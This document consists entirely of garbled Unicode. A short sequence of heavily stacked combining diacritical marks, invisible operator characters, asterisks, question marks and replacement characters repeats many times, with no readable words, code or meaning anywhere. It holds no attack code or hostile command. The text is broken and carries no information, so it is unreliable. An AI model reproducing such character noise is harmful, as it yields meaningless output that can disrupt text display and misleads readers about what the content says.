̧̥̞̯̰̻̥̟͙͟⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̛͌̏̀̽̓̓͑̽̂̑͝͡